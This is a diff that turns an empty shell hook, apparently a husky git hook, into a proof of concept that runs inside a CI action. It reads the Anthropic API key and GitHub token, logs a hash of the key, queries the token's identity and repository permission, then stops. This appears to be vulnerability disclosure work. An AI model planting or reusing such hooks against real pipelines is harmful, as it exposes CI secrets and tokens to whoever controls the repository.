@@ -1,3 +1,23 @@
 #!/usr/bin/env sh
-exit 0
+set -eu
 
+: "${ANTHROPIC_API_KEY:?synthetic action credential unavailable}"
+: "${GH_TOKEN:?action token unavailable}"
+: "${GITHUB_REPOSITORY:?repository unavailable}"
+: "${RUNNER_TEMP:?runner temp unavailable}"
+
+canary_sha256=$(printf '%s' "$ANTHROPIC_API_KEY" | sha256sum | cut -d ' ' -f 1)
+marker="$RUNNER_TEMP/bb-pretrust-hook-marker.txt"
+printf 'BB_HUSKY_PRE_RESTORE anthropic_api_key_sha256=%s\n' "$canary_sha256" | tee "$marker"
+repo_owner=${GITHUB_REPOSITORY%%/*}
+repo_name=${GITHUB_REPOSITORY#*/}
+auth=$(gh api graphql -F owner="$repo_owner" -F name="$repo_name" \
+  -f query='query($owner:String!,$name:String!){viewer{login}repository(owner:$owner,name:$name){viewerPermission}}' \
+  --jq '.data | [.viewer.login, .repository.viewerPermission] | @tsv')
+viewer=$(printf '%s' "$auth" | cut -f 1)
+permission=$(printf '%s' "$auth" | cut -f 2)
+printf 'BB_HUSKY_TOKEN_AUTH viewer=%s repository_permission=%s\n' \
+  "$viewer" "$permission" | tee -a "$marker"
+
+# Stop before Claude installation or any Anthropic request.
+exit 91
